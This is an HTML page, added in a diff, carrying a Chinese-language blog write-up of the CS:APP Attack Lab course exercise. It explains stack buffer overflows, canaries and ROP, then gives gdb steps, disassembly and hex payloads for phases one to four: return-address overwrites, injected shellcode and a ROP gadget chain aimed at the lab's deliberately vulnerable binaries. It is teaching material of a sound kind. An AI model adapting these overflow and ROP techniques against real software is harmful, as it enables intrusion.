@@ -1,0 +1,520 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/images/icon.png">
+  <link rel="icon" href="/images/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="th-loading">
+  <meta name="keywords" content="">
+  <meta name="description" content="前置知识 缓冲区溢出 将栈指针作为输入，则若缓冲区溢出，整个栈帧都会受影响。而栈需要保存返回的断点，若栈帧相邻，则可以改变返回函数的断点，从而返回到我们指定的一个函数。针对溢出，有三种处理方式  设置段寻址的，每次的值不同的canary值，通过gdb可以知道单次的值    每次的stack地址随机，不一定能跳装到字符串的地址运行。但全局变量和代码的位置不变。 设置栈区的值为不可执行代码  ROP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CS:APP Attack Lab记录">
+<meta property="og:url" content="http://example.com/2023/02/19/attack/index.html">
+<meta property="og:site_name" content="loading">
+<meta property="og:description" content="前置知识 缓冲区溢出 将栈指针作为输入，则若缓冲区溢出，整个栈帧都会受影响。而栈需要保存返回的断点，若栈帧相邻，则可以改变返回函数的断点，从而返回到我们指定的一个函数。针对溢出，有三种处理方式  设置段寻址的，每次的值不同的canary值，通过gdb可以知道单次的值    每次的stack地址随机，不一定能跳装到字符串的地址运行。但全局变量和代码的位置不变。 设置栈区的值为不可执行代码  ROP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/reg_canary.png">
+<meta property="og:image" content="http://example.com/images/ROP_attack.png">
+<meta property="og:image" content="http://example.com/images/phase_1.png">
+<meta property="og:image" content="http://example.com/images/phase_2.png">
+<meta property="og:image" content="http://example.com/images/phase_3.png">
+<meta property="article:published_time" content="2023-02-19T09:20:08.000Z">
+<meta property="article:modified_time" content="2023-09-19T12:04:21.712Z">
+<meta property="article:author" content="th-loading">
+<meta property="article:tag" content="CS">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/reg_canary.png">
+  
+  <title>CS:APP Attack Lab记录 - loading</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>loading</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/images/tb.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="CS:APP Attack Lab记录">
+              
+                CS:APP Attack Lab记录
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-02-19 17:20" pubdate>
+        2023年2月19日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.2k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      10 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CS:APP Attack Lab记录</h1>
+            
+            <div class="markdown-body">
+              <h1 id="前置知识">前置知识</h1>
+<h2 id="缓冲区溢出">缓冲区溢出</h2>
+<p>将栈指针作为输入，则若缓冲区溢出，整个栈帧都会受影响。而栈需要保存返回的断点，若栈帧相邻，则可以改变返回函数的断点，从而返回到我们指定的一个函数。针对溢出，有三种处理方式</p>
+<ol type="1">
+<li>设置段寻址的，每次的值不同的canary值，通过gdb可以知道单次的值</li>
+</ol>
+<p><img src="/images/reg_canary.png" srcset="/img/loading.gif" lazyload alt="金丝雀值" style="zoom:50%;"/></p>
+<ol start="2" type="1">
+<li>每次的stack地址随机，不一定能跳装到字符串的地址运行。但全局变量和代码的位置不变。</li>
+<li>设置栈区的值为不可执行代码</li>
+</ol>
+<p>ROP
+attack，借助已有的代码，和ret的特性，不断借助栈跳转代码以达到目的。</p>
+<p><img src="/images/ROP_attack.png" srcset="/img/loading.gif" lazyload alt="ROP方式" style="zoom:50%;"  /></p>
+<h1 id="具体流程">具体流程</h1>
+<h2 id="quick-start">Quick Start</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://csapp.cs.cmu.edu/3e/target1.tar<br>tar -xvf target1.tar <br></code></pre></td></tr></table></figure>
+<p>结合汇编代码中16进制数代表的指令，通过hex2raw输入程序，可以注入自己想要让其运行的程序，达到攻击的效果。注意不能包含0x0a，代表。其中借助Code
+injection完成3个touch函数的调用，借助Return-oriented
+programming完成两个函数的调用。</p>
+<h2 id="phase1">Phase1</h2>
+<p><img src="/images/phase_1.png" srcset="/img/loading.gif" lazyload alt="phase 1" style="zoom:50%;"/></p>
+<p>先通过gdb判断汇编函数的入口在于stable_launch -&gt; launch -&gt;
+test</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">break</span> *<span class="hljs-built_in">test</span><br>run -q<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> 900 0000000000401968 &lt;test&gt;:<br> 901   401968:   48 83 ec 08             sub    $0x8,%rsp<br> 902   40196c:   b8 00 00 00 00          mov    $0x0,%eax<br> 903   401971:   e8 32 fe ff ff          callq  4017a8 &lt;getbuf&gt;<br> 904   401976:   89 c2                   mov    %eax,%edx<br> 905   401978:   be 88 31 40 00          mov    $0x403188,%esi<br> 906   40197d:   bf 01 00 00 00          mov    $0x1,%edi<br> 907   401982:   b8 00 00 00 00          mov    $0x0,%eax<br> 908   401987:   e8 64 f4 ff ff          callq  400df0 &lt;__printf_chk@plt&gt;<br> 909   40198c:   48 83 c4 08             add    $0x8,%rsp<br> 910   401990:   c3                      retq<br><br># getbuf栈的大小为40Byte<br>00000000004017a8 &lt;getbuf&gt;:<br> 778   4017a8:   48 83 ec 28             sub    $0x28,%rsp<br> 779   4017ac:   48 89 e7                mov    %rsp,%rdi <br> 780   4017af:   e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;<br> 781   4017b4:   b8 01 00 00 00          mov    $0x1,%eax<br> 782   4017b9:   48 83 c4 28             add    $0x28,%rsp<br> 783   4017bd:   c3                      retq<br> 784   4017be:   90                      nop<br> 785   4017bf:   90                      nop<br><br></code></pre></td></tr></table></figure>
+<p>结合writeup可知C语言的函数为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>	<span class="hljs-type">int</span> val;<br>	val = getbuf();<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>结合gdb判断跳转函数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 对应返回函数的值</span><br>x <span class="hljs-variable">$rsp</span><br><span class="hljs-comment"># call getbuf前的rsp: 0x5561dca8 </span><br><span class="hljs-comment"># call 之后rsp: 0x5561dca0 可以看出留出了8byte</span><br><span class="hljs-comment"># x $rsp : 0x00401976 对应返回的断点</span><br><span class="hljs-comment"># sub 0x28 rsp:0x5561dc78 作为输入的函数 因此只需要把 0x5561dca0对应的值改成touch1的地址即可</span><br><span class="hljs-comment"># 40Byte的字符串 将最后8byte作为返回地址输入即可</span><br><span class="hljs-comment"># 00 00 00 00 00 40 17 c0 </span><br>./hex2raw &lt; phase_1.txt &gt; phase_1-raw.txt<br>./ctarget -q &lt; phase_1-raw.txt<br><span class="hljs-comment"># ? illlegal instruction </span><br><span class="hljs-comment"># 注意小端序存储 原以为8byte</span><br><span class="hljs-comment"># 似乎只要4byte</span><br>x <span class="hljs-variable">$rsp</span> 0x5561dca0:     0x00401976<br><span class="hljs-comment"># pass</span><br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>C0 17 40 00 00 00 00 00<br></code></pre></td></tr></table></figure>
+<h2 id="phase2">Phase2</h2>
+<p><img src="/images/phase_2.png" srcset="/img/loading.gif" lazyload alt="phase 2" style="zoom:50%;"/></p>
+<p>在栈的位置执行代码，输入特定的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 需要注入cookies的参数 32bit<br>mov 0x59b997fa %edi <br><br># 参考这个代码<br>bf 01 00 00 00          mov    $0x1,%edi<br>bf fa 97 b9 59 			<br><br># 根据提示，应该根据ret进行跳装 当前rsp的值就是返回的值 <br># ?不定长 5byte<br>bf fa 97 b9 59 # mov $0x59b997fa %edi  <br>c3  # retq<br>0x5561dc78 # pc1<br>0x4017ec # pc2<br>bf fa 97 b9 59 c3 FF FF<br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>78 dc 61 55 00 00 00 00<br>ec 17 40 00 00 00 00 00 <br></code></pre></td></tr></table></figure>
+<h2 id="phase3">Phase3</h2>
+<p><img src="/images/phase_3.png" srcset="/img/loading.gif" lazyload alt="phase 3" style="zoom:50%;" /></p>
+<p>edi为指针，使得值相同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x5561dc78 # pc1<br>0x4018fa # pc2<br>0x59b997fa #cookie<br><br>bf 80 dc 61 55 c3 FF FF<br>35 39 62 39 39 37 66 61 <br>00 FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>78 dc 61 55 00 00 00 00<br>fa 18 40 00 00 00 00 00<br><br><br># 似乎被覆盖了?<br># 需要在更前面<br>bf b0 dc 61 55 c3 FF FF<br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>78 dc 61 55 00 00 00 00<br>fa 18 40 00 00 00 00 00<br>35 39 62 39 39 37 66 61 <br>00 FF FF FF FF FF FF FF<br><br># pass<br></code></pre></td></tr></table></figure>
+<h2 id="phase4">phase4</h2>
+<p>借助rop的gadget，源代码设计了gadget farm，便于操作。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d rtarget &gt; b.asm<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># :/retq 在vim寻找retq可以借助ret来跳转<br># :/48 c4 等操作码，观察可以使用的元素 结合指令表格确定需要的操作<br># 在最后一次ret之前需要完成设置参数并移动寄存器<br><br># 在start_farm和mid_farm之间，两个gadgets<br># 借助popq的特性传参 58 - 5f<br># 0x90 nop<br><br># farm<br>4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax<br>4019cf:   c3                      retq<br>4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax<br><br># gadget<br>4019cc:   58 					   popq %rax<br>4019cd:   90 					   nop<br>4019ce:   c3					   ret<br> <br>4019a3:   89 c7					   mov %eax, %edi <br>4019a5:   c3 					   ret<br><br># 根据上面的跳转设置值<br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>cc 19 40 00 00 00 00 00 /* ret gadget 1 */<br>fa 97 b9 59 00 00 00 00 /* popq %rax */<br>a3 19 40 00 00 00 00 00 /* ret 4019a3 */<br>ec 17 40 00 00 00 00 00 /* ret touch2 */<br><br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CS/">CS</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/27/cache/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CS:APP Cache Lab记录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/17/bomb/">
+                        <span class="hidden-mobile">CS:APP Bomb Lab记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        loader: {
+          load: ['ui/lazy']
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js" ></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
